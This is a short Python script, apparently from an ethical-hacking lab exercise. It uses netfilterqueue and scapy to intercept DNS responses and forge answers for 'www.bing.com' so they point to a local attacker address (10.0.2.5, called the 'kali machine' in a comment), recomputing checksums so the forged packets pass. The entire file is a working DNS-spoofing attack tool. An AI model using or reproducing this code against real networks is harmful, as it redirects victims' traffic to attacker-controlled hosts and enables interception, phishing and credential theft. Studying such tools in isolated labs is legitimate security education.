#! /usr/bin/env python
# Compatibility: Python 3.x

import netfilterqueue
import scapy.all as scapy


# TODO: Cleanup all scripts with scapy to load appropriate modules such that PyCharm doesn't complain.
# Resource: https://stackoverflow.com/questions/45691654/unresolved-reference-with-scapy
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in str(qname):
            print("[+] Spoofing target...")
            # TODO: Add, wherever possible, the ip address of kali machine
            #  as an argument to program or get it automatically.
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.5")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packet))

    packet.accept()


print("[+] Queue has been created.")
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
